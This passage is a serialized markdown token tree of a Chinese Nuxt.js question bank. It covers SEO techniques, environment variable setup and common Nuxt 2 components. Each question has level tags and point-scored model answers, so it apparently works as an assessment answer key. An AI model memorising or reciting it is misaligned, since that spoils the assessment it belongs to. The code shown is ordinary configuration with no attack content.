Nuxt.js的SEO优化方案有哪些？\\n\\n","depth":2,"text":"Nuxt.js的SEO优化方案有哪些？","tokens":[{"type":"text","raw":"Nuxt.js的SEO优化方案有哪些？","text":"Nuxt.js的SEO优化方案有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"* **1：** Meta标签管理：\\n\\n  ```js\\n  head() {\\n    return {\\n      title: this.title,\\n      meta: [\\n        { hid: \'description\', name: \'description\', content: this.description },\\n        { hid: \'keywords\', name: \'keywords\', content: this.keywords }\\n      ]\\n    }\\n  }\\n  ```\\n\\n* **1：** 服务端渲染(SSR)：\\n  + 预渲染完整HTML\\n  + 更好的首屏加载\\n  + 搜索引擎可直接爬取内容\\n\\n  ```js\\n  // nuxt.config.js\\n  export default {\\n    ssr: true\\n  }\\n  ```\\n\\n* **1：** 静态站点生成(SSG)：\\n  + 构建时生成静态HTML\\n  + 适合内容不常更新的站点\\n\\n  ```js\\n  // nuxt.config.js\\n  export default {\\n    target: \'static\',\\n    generate: {\\n      routes: [\'/posts/1\', \'/posts/2\']\\n    }\\n  }\\n  ```\\n\\n* **1：** 结构化数据：\\n  + 实现JSON-LD\\n  + 添加Schema.org标记\\n  + 提供更丰富的搜索结果\\n\\n  ```js\\n  head() {\\n    return {\\n      script: [{\\n        type: \'application/ld+json\',\\n        json: {\\n          \\"@context\\": \\"https://schema.org\\",\\n          \\"@type\\": \\"Article\\",\\n          \\"headline\\": this.title\\n        }\\n      }]\\n    }\\n  }\\n  ```\\n\\n* **1：** 性能优化：\\n  + 图片懒加载\\n  + 资源预加载\\n  + 代码分割\\n  + 缓存策略\\n\\n  ```js\\n  // nuxt.config.js\\n  export default {\\n    render: {\\n      http2: {\\n        push: true\\n      },\\n      static: {\\n        maxAge: 1000 * 60 * 60 * 24 * 7\\n      }\\n    }\\n  }\\n  ```","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* **1：** Meta标签管理：\\n\\n  ```js\\n  head() {\\n    return {\\n      title: this.title,\\n      meta: [\\n        { hid: \'description\', name: \'description\', content: this.description },\\n        { hid: \'keywords\', name: \'keywords\', content: this.keywords }\\n      ]\\n    }\\n  }\\n  ```\\n\\n","task":false,"loose":true,"text":"**1：** Meta标签管理：\\n\\n```js\\nhead() {\\n  return {\\n    title: this.title,\\n    meta: [\\n      { hid: \'description\', name: \'description\', content: this.description },\\n      { hid: \'keywords\', name: \'keywords\', content: this.keywords }\\n    ]\\n  }\\n}\\n```\\n","tokens":[{"type":"text","raw":"**1：** Meta标签管理：","text":"**1：** Meta标签管理：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Meta标签管理：","text":" Meta标签管理：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nhead() {\\n  return {\\n    title: this.title,\\n    meta: [\\n      { hid: \'description\', name: \'description\', content: this.description },\\n      { hid: \'keywords\', name: \'keywords\', content: this.keywords }\\n    ]\\n  }\\n}\\n```\\n","lang":"js","text":"head() {\\n  return {\\n    title: this.title,\\n    meta: [\\n      { hid: \'description\', name: \'description\', content: this.description },\\n      { hid: \'keywords\', name: \'keywords\', content: this.keywords }\\n    ]\\n  }\\n}"}]},{"type":"list_item","raw":"* **1：** 服务端渲染(SSR)：\\n  + 预渲染完整HTML\\n  + 更好的首屏加载\\n  + 搜索引擎可直接爬取内容\\n\\n  ```js\\n  // nuxt.config.js\\n  export default {\\n    ssr: true\\n  }\\n  ```\\n\\n","task":false,"loose":true,"text":"**1：** 服务端渲染(SSR)：\\n+ 预渲染完整HTML\\n+ 更好的首屏加载\\n+ 搜索引擎可直接爬取内容\\n\\n```js\\n// nuxt.config.js\\nexport default {\\n  ssr: true\\n}\\n```\\n","tokens":[{"type":"text","raw":"**1：** 服务端渲染(SSR)：\\n","text":"**1：** 服务端渲染(SSR)：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 服务端渲染(SSR)：","text":" 服务端渲染(SSR)：","escaped":false}]},{"type":"list","raw":"+ 预渲染完整HTML\\n+ 更好的首屏加载\\n+ 搜索引擎可直接爬取内容","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 预渲染完整HTML\\n","task":false,"loose":false,"text":"预渲染完整HTML","tokens":[{"type":"text","raw":"预渲染完整HTML","text":"预渲染完整HTML","tokens":[{"type":"text","raw":"预渲染完整HTML","text":"预渲染完整HTML","escaped":false}]}]},{"type":"list_item","raw":"+ 更好的首屏加载\\n","task":false,"loose":false,"text":"更好的首屏加载","tokens":[{"type":"text","raw":"更好的首屏加载","text":"更好的首屏加载","tokens":[{"type":"text","raw":"更好的首屏加载","text":"更好的首屏加载","escaped":false}]}]},{"type":"list_item","raw":"+ 搜索引擎可直接爬取内容","task":false,"loose":false,"text":"搜索引擎可直接爬取内容","tokens":[{"type":"text","raw":"搜索引擎可直接爬取内容","text":"搜索引擎可直接爬取内容","tokens":[{"type":"text","raw":"搜索引擎可直接爬取内容","text":"搜索引擎可直接爬取内容","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// nuxt.config.js\\nexport default {\\n  ssr: true\\n}\\n```\\n","lang":"js","text":"// nuxt.config.js\\nexport default {\\n  ssr: true\\n}"}]},{"type":"list_item","raw":"* **1：** 静态站点生成(SSG)：\\n  + 构建时生成静态HTML\\n  + 适合内容不常更新的站点\\n\\n  ```js\\n  // nuxt.config.js\\n  export default {\\n    target: \'static\',\\n    generate: {\\n      routes: [\'/posts/1\', \'/posts/2\']\\n    }\\n  }\\n  ```\\n\\n","task":false,"loose":true,"text":"**1：** 静态站点生成(SSG)：\\n+ 构建时生成静态HTML\\n+ 适合内容不常更新的站点\\n\\n```js\\n// nuxt.config.js\\nexport default {\\n  target: \'static\',\\n  generate: {\\n    routes: [\'/posts/1\', \'/posts/2\']\\n  }\\n}\\n```\\n","tokens":[{"type":"text","raw":"**1：** 静态站点生成(SSG)：\\n","text":"**1：** 静态站点生成(SSG)：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 静态站点生成(SSG)：","text":" 静态站点生成(SSG)：","escaped":false}]},{"type":"list","raw":"+ 构建时生成静态HTML\\n+ 适合内容不常更新的站点","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 构建时生成静态HTML\\n","task":false,"loose":false,"text":"构建时生成静态HTML","tokens":[{"type":"text","raw":"构建时生成静态HTML","text":"构建时生成静态HTML","tokens":[{"type":"text","raw":"构建时生成静态HTML","text":"构建时生成静态HTML","escaped":false}]}]},{"type":"list_item","raw":"+ 适合内容不常更新的站点","task":false,"loose":false,"text":"适合内容不常更新的站点","tokens":[{"type":"text","raw":"适合内容不常更新的站点","text":"适合内容不常更新的站点","tokens":[{"type":"text","raw":"适合内容不常更新的站点","text":"适合内容不常更新的站点","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// nuxt.config.js\\nexport default {\\n  target: \'static\',\\n  generate: {\\n    routes: [\'/posts/1\', \'/posts/2\']\\n  }\\n}\\n```\\n","lang":"js","text":"// nuxt.config.js\\nexport default {\\n  target: \'static\',\\n  generate: {\\n    routes: [\'/posts/1\', \'/posts/2\']\\n  }\\n}"}]},{"type":"list_item","raw":"* **1：** 结构化数据：\\n  + 实现JSON-LD\\n  + 添加Schema.org标记\\n  + 提供更丰富的搜索结果\\n\\n  ```js\\n  head() {\\n    return {\\n      script: [{\\n        type: \'application/ld+json\',\\n        json: {\\n          \\"@context\\": \\"https://schema.org\\",\\n          \\"@type\\": \\"Article\\",\\n          \\"headline\\": this.title\\n        }\\n      }]\\n    }\\n  }\\n  ```\\n\\n","task":false,"loose":true,"text":"**1：** 结构化数据：\\n+ 实现JSON-LD\\n+ 添加Schema.org标记\\n+ 提供更丰富的搜索结果\\n\\n```js\\nhead() {\\n  return {\\n    script: [{\\n      type: \'application/ld+json\',\\n      json: {\\n        \\"@context\\": \\"https://schema.org\\",\\n        \\"@type\\": \\"Article\\",\\n        \\"headline\\": this.title\\n      }\\n    }]\\n  }\\n}\\n```\\n","tokens":[{"type":"text","raw":"**1：** 结构化数据：\\n","text":"**1：** 结构化数据：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 结构化数据：","text":" 结构化数据：","escaped":false}]},{"type":"list","raw":"+ 实现JSON-LD\\n+ 添加Schema.org标记\\n+ 提供更丰富的搜索结果","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 实现JSON-LD\\n","task":false,"loose":false,"text":"实现JSON-LD","tokens":[{"type":"text","raw":"实现JSON-LD","text":"实现JSON-LD","tokens":[{"type":"text","raw":"实现JSON-LD","text":"实现JSON-LD","escaped":false}]}]},{"type":"list_item","raw":"+ 添加Schema.org标记\\n","task":false,"loose":false,"text":"添加Schema.org标记","tokens":[{"type":"text","raw":"添加Schema.org标记","text":"添加Schema.org标记","tokens":[{"type":"text","raw":"添加Schema.org标记","text":"添加Schema.org标记","escaped":false}]}]},{"type":"list_item","raw":"+ 提供更丰富的搜索结果","task":false,"loose":false,"text":"提供更丰富的搜索结果","tokens":[{"type":"text","raw":"提供更丰富的搜索结果","text":"提供更丰富的搜索结果","tokens":[{"type":"text","raw":"提供更丰富的搜索结果","text":"提供更丰富的搜索结果","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nhead() {\\n  return {\\n    script: [{\\n      type: \'application/ld+json\',\\n      json: {\\n        \\"@context\\": \\"https://schema.org\\",\\n        \\"@type\\": \\"Article\\",\\n        \\"headline\\": this.title\\n      }\\n    }]\\n  }\\n}\\n```\\n","lang":"js","text":"head() {\\n  return {\\n    script: [{\\n      type: \'application/ld+json\',\\n      json: {\\n        \\"@context\\": \\"https://schema.org\\",\\n        \\"@type\\": \\"Article\\",\\n        \\"headline\\": this.title\\n      }\\n    }]\\n  }\\n}"}]},{"type":"list_item","raw":"* **1：** 性能优化：\\n  + 图片懒加载\\n  + 资源预加载\\n  + 代码分割\\n  + 缓存策略\\n\\n  ```js\\n  // nuxt.config.js\\n  export default {\\n    render: {\\n      http2: {\\n        push: true\\n      },\\n      static: {\\n        maxAge: 1000 * 60 * 60 * 24 * 7\\n      }\\n    }\\n  }\\n  ```","task":false,"loose":true,"text":"**1：** 性能优化：\\n+ 图片懒加载\\n+ 资源预加载\\n+ 代码分割\\n+ 缓存策略\\n\\n```js\\n// nuxt.config.js\\nexport default {\\n  render: {\\n    http2: {\\n      push: true\\n    },\\n    static: {\\n      maxAge: 1000 * 60 * 60 * 24 * 7\\n    }\\n  }\\n}\\n```","tokens":[{"type":"text","raw":"**1：** 性能优化：\\n","text":"**1：** 性能优化：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 性能优化：","text":" 性能优化：","escaped":false}]},{"type":"list","raw":"+ 图片懒加载\\n+ 资源预加载\\n+ 代码分割\\n+ 缓存策略","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 图片懒加载\\n","task":false,"loose":false,"text":"图片懒加载","tokens":[{"type":"text","raw":"图片懒加载","text":"图片懒加载","tokens":[{"type":"text","raw":"图片懒加载","text":"图片懒加载","escaped":false}]}]},{"type":"list_item","raw":"+ 资源预加载\\n","task":false,"loose":false,"text":"资源预加载","tokens":[{"type":"text","raw":"资源预加载","text":"资源预加载","tokens":[{"type":"text","raw":"资源预加载","text":"资源预加载","escaped":false}]}]},{"type":"list_item","raw":"+ 代码分割\\n","task":false,"loose":false,"text":"代码分割","tokens":[{"type":"text","raw":"代码分割","text":"代码分割","tokens":[{"type":"text","raw":"代码分割","text":"代码分割","escaped":false}]}]},{"type":"list_item","raw":"+ 缓存策略","task":false,"loose":false,"text":"缓存策略","tokens":[{"type":"text","raw":"缓存策略","text":"缓存策略","tokens":[{"type":"text","raw":"缓存策略","text":"缓存策略","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n// nuxt.config.js\\nexport default {\\n  render: {\\n    http2: {\\n      push: true\\n    },\\n    static: {\\n      maxAge: 1000 * 60 * 60 * 24 * 7\\n    }\\n  }\\n}\\n```","lang":"js","text":"// nuxt.config.js\\nexport default {\\n  render: {\\n    http2: {\\n      push: true\\n    },\\n    static: {\\n      maxAge: 1000 * 60 * 60 * 24 * 7\\n    }\\n  }\\n}"}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何在 Nuxt.js 中配置和使用环境变量？\\n\\n","depth":2,"text":"如何在 Nuxt.js 中配置和使用环境变量？","tokens":[{"type":"text","raw":"如何在 Nuxt.js 中配置和使用环境变量？","text":"如何在 Nuxt.js 中配置和使用环境变量？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"* **1：** 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n义变量，如`API_URL=<http://localhost:3000/api（开发环境下的> API 地址）`。\\n* **1：** 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n义变量，如`API_URL=<http://localhost:3000/api（开发环境下的> API 地址）`。\\n","task":false,"loose":false,"text":"**1：** 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n义变量，如`API_URL=<http://localhost:3000/api（开发环境下的> API 地址）`。","tokens":[{"type":"text","raw":"**1：** 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n\\n义变量，如`API_URL=<http://localhost:3000/api（开发环境下的> API 地址）`。","text":"**1：** 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n义变量，如`API_URL=<http://localhost:3000/api（开发环境下的> API 地址）`。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n义变量，如","text":" 创建.env文件：在项目根目录下创建.env文件，例如.env.development用于开发环境，.env.production用于生产环境，在文件中定\\n义变量，如","escaped":false},{"type":"codespan","raw":"`API_URL=<http://localhost:3000/api（开发环境下的> API 地址）`","text":"API_URL=<http://localhost:3000/api（开发环境下的> API 地址）"},{"type":"text","raw":"。","text":"。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：","task":false,"loose":false,"text":"**1：** 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：","tokens":[{"type":"text","raw":"**1：** 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：","text":"**1：** 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：","text":" 在nuxt.config.js中配置：使用@nuxtjs/dotenv模块（需先安装），在nuxt.config.js中添加如下配置：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nmodules: [\\n  \'@nuxtjs/dotenv\'\\n]\\n```","lang":"js","text":"modules: [\\n  \'@nuxtjs/dotenv\'\\n]"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"* **1：** 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。","task":false,"loose":false,"text":"**1：** 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。","tokens":[{"type":"text","raw":"**1：** 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。","text":"**1：** 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。","text":" 在代码中使用：在组件或模块中，可以通过process.env.API_URL来获取环境变量的值，然后在发送 API 请求等操作中使用该地址，这样在\\n不同环境下可以方便地切换 API 地址等配置信息，而无需修改代码中的硬编码值。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## nuxt2常用的组件有哪些\\n\\n","depth":2,"text":"nuxt2常用的组件有哪些","tokens":[{"type":"text","raw":"nuxt2常用的组件有哪些","text":"nuxt2常用的组件有哪些","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"* **1：** `<Nuxt>`Nuxt 框架中的核心组件;\\n* `<NuxtLink>`用于在 Nuxt 应用内部进行页面导航;\\n* `<ClientOnly>`只在客户端被渲染和执行;\\n* `<NoSSR>`用来处理不适合在服务端渲染的内容;\\n* `<Transition>`用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。\\n\\n* **1：** `<NuxtChild>`主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;\\n* `<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态;\\n* `<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"* **1：** `<Nuxt>`Nuxt 框架中的核心组件;\\n","task":false,"loose":true,"text":"**1：** `<Nuxt>`Nuxt 框架中的核心组件;","tokens":[{"type":"text","raw":"**1：** `<Nuxt>`Nuxt 框架中的核心组件;","text":"**1：** `<Nuxt>`Nuxt 框架中的核心组件;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ","text":" ","escaped":false},{"type":"codespan","raw":"`<Nuxt>`","text":"<Nuxt>"},{"type":"text","raw":"Nuxt 框架中的核心组件;","text":"Nuxt 框架中的核心组件;","escaped":false}]}]},{"type":"list_item","raw":"* `<NuxtLink>`用于在 Nuxt 应用内部进行页面导航;\\n","task":false,"loose":true,"text":"`<NuxtLink>`用于在 Nuxt 应用内部进行页面导航;","tokens":[{"type":"text","raw":"`<NuxtLink>`用于在 Nuxt 应用内部进行页面导航;","text":"`<NuxtLink>`用于在 Nuxt 应用内部进行页面导航;","tokens":[{"type":"codespan","raw":"`<NuxtLink>`","text":"<NuxtLink>"},{"type":"text","raw":"用于在 Nuxt 应用内部进行页面导航;","text":"用于在 Nuxt 应用内部进行页面导航;","escaped":false}]}]},{"type":"list_item","raw":"* `<ClientOnly>`只在客户端被渲染和执行;\\n","task":false,"loose":true,"text":"`<ClientOnly>`只在客户端被渲染和执行;","tokens":[{"type":"text","raw":"`<ClientOnly>`只在客户端被渲染和执行;","text":"`<ClientOnly>`只在客户端被渲染和执行;","tokens":[{"type":"codespan","raw":"`<ClientOnly>`","text":"<ClientOnly>"},{"type":"text","raw":"只在客户端被渲染和执行;","text":"只在客户端被渲染和执行;","escaped":false}]}]},{"type":"list_item","raw":"* `<NoSSR>`用来处理不适合在服务端渲染的内容;\\n","task":false,"loose":true,"text":"`<NoSSR>`用来处理不适合在服务端渲染的内容;","tokens":[{"type":"text","raw":"`<NoSSR>`用来处理不适合在服务端渲染的内容;","text":"`<NoSSR>`用来处理不适合在服务端渲染的内容;","tokens":[{"type":"codespan","raw":"`<NoSSR>`","text":"<NoSSR>"},{"type":"text","raw":"用来处理不适合在服务端渲染的内容;","text":"用来处理不适合在服务端渲染的内容;","escaped":false}]}]},{"type":"list_item","raw":"* `<Transition>`用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。\\n\\n","task":false,"loose":true,"text":"`<Transition>`用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。\\n","tokens":[{"type":"text","raw":"`<Transition>`用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。\\n","text":"`<Transition>`用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。","tokens":[{"type":"codespan","raw":"`<Transition>`","text":"<Transition>"},{"type":"text","raw":"用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。","text":"用于给页面或组件的切换添加过渡动画效果，增强用户体验，让页面之间的转换更加平滑自然。可以设置不同的动画类型、时长、延迟等参数。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** `<NuxtChild>`主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;\\n","task":false,"loose":true,"text":"**1：** `<NuxtChild>`主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;","tokens":[{"type":"text","raw":"**1：** `<NuxtChild>`主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;","text":"**1：** `<NuxtChild>`主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" ","text":" ","escaped":false},{"type":"codespan","raw":"`<NuxtChild>`","text":"<NuxtChild>"},{"type":"text","raw":"主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;","text":"主要用于嵌套路由场景。当有多层级的路由，且子路由对应的页面需要在父路由布局中的特定位置展示时，就会用到该组件;","escaped":false}]}]},{"type":"list_item","raw":"* `<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态;\\n","task":false,"loose":true,"text":"`<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态;","tokens":[{"type":"text","raw":"`<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态;","text":"`<KeepAlive>`保留组件的状态，让它在切换后依然保持之前的状态;","tokens":[{"type":"codespan","raw":"`<KeepAlive>`","text":"<KeepAlive>"},{"type":"text","raw":"保留组件的状态，让它在切换后依然保持之前的状态;","text":"保留组件的状态，让它在切换后依然保持之前的状态;","escaped":false}]}]},{"type":"list_item","raw":"* `<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.","task":false,"loose":true,"text":"`<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.","tokens":[{"type":"text","raw":"`<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.","text":"`<slot>`用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.","tokens":[{"type":"codespan","raw":"`<slot>`","text":"<slot>"},{"type":"text","raw":"用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.","text":"用于实现内容分发机制。父组件可以向子组件传递内容，子组件通过slot来接收并展示这些内容.","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## nuxt3常用的组件有哪些\\n\\n","depth":2,"text":"nuxt3常用的组件有哪些","tokens":[{"type":"text","raw":"nuxt3常用的组件有哪些","text":"nuxt3常用的组件有哪些","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 